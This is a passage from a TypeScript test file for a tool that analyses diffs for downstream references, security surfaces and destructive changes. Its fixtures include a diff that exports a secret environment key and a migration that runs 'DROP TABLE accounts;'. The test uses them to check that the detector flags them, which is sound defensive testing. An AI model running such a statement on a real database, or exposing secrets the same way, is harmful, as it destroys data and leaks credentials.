          "@@ -1,1 +1,2 @@",
          "-export function compute() { return 1; }",
          "+export function compute(factor: number) { return factor; }",
          "+export const SECRET = process.env.SECRET_KEY;",
        ].join("\n"),
        path: "src/core.ts",
      },
    ];

    const repositoryFiles = [
      {
        content: "import { compute ,} from './core';\ncompute();\n",
        path: "src/app.ts",
      },
    ];

    const report = analyzeStructuralImpact({
      changedFiles,
      repositoryFiles,
    });

    expect(report.changedSymbols).toHaveLength(2);
    expect(report.downstreamReferences).toHaveLength(2);
    expect(report.totalDownstreamReferencesCount).toBe(2);
    expect(report.securitySurfaces).toHaveLength(1);
    expect(report.repositoryScanTruncated).toBe(false);
  });

  it("keeps destructive SQL as an investigation signal rather than a proven defect", () => {
    const patch = [
      "diff --git a/migrations/002.sql b/migrations/002.sql",
      "--- a/migrations/002.sql",
      "+++ b/migrations/002.sql",
      "@@ -0,0 +1 @@",
      "+DROP TABLE accounts;",
    ].join("\n");

    const report = analyzeStructuralImpact({
      changedFiles: [{ patch, path: "migrations/002.sql" }],
      repositoryFiles: [],
    });

    expect(report.contractBreaks).toHaveLength(1);
    expect(report).not.toHaveProperty("deterministicFindings");
  });
});
